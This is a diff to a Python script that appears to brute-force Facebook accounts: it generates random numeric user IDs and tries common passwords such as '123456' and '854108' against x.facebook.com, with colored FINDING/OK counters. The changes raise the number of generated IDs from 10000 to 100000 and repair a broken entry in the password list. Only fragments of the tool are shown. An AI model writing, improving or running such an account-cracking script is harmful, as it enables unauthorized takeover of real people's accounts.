@@ -450,7 +450,7 @@ def main():
     ask=input(f"\033[1;31m[\033[1;32m?\033[1;31m] INPUT \033[1;32m:\033[1;33m ")
     lin()
     if ask in["1"]:
-        newrin="10000"
+        newrin="100000"
         for i in range(int(limit)):
             data=str(random.choice(range(1000000000,1999999999)))
             user.append(data)
@@ -471,7 +471,7 @@ def login(uid):
     try:
         sys.stdout.write(f'\r\x1b[38;5;196m[\x1b[38;5;48mFINDING\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\033[1;32m{loop}\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK•{len(oks)}\x1b[38;5;196m]')
         sys.stdout.flush()
-        for pw in ["123456", "1234567890", "123456789"854108"]:
+        for pw in ["123456", "1234567890", "123456789", "854108"]:
 
             headers = {
     'authority': 'x.facebook.com',
